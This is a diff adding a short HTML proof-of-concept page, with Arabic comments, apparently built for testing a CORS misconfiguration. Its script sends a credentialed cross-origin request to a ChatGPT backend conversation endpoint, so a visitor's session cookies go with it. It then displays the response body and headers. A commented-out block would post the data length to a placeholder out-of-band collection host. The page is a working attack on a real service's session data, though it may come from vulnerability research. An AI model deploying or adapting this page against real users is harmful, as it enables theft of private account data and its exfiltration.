@@ -1,0 +1,43 @@
+<!doctype html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <title>CORS PoC</title>
+  </head>
+  <body>
+    <h1>CORS PoC</h1>
+    <pre id="out">Loading…</pre>
+
+    <script>
+      // عدّل الـ URL إلى endpoint بيرجع بيانات حساسة قابلة للقراءة
+      // مثال توضيحي مشابه للي بعته:
+      const target = "https://chatgpt.com/backend-api/conversation/68a3761c-bb40-832c-93f6-28c5f63fd214";
+
+      fetch(target, {
+        method: "GET",                 // استخدم GET أولاً لتفادي preflight
+        credentials: "include",        // مهم لإرسال الكوكيز/السيشن
+        headers: {
+          "Accept": "application/json"
+        }
+      })
+      .then(async (res) => {
+        const text = await res.text();
+        document.getElementById("out").textContent =
+          `Status: ${res.status}\n` +
+          `ACAO: ${res.headers.get("access-control-allow-origin")}\n` +
+          `ACAC: ${res.headers.get("access-control-allow-credentials")}\n\n` +
+          `Body (truncated 1k):\n` + text.slice(0, 1024);
+        
+        // (اختياري) لإثبات exfiltration بشكل أخلاقي: ابعت طول البيانات بس لسيرفرك
+        // fetch("https://<your-sub>.oastify.com/log", {
+        //   method: "POST",
+        //   body: JSON.stringify({len: text.length}),
+        //   headers: {"Content-Type": "application/json"}
+        // });
+      })
+      .catch(e => {
+        document.getElementById("out").textContent = "Error: " + e;
+      });
+    </script>
+  </body>
+</html>
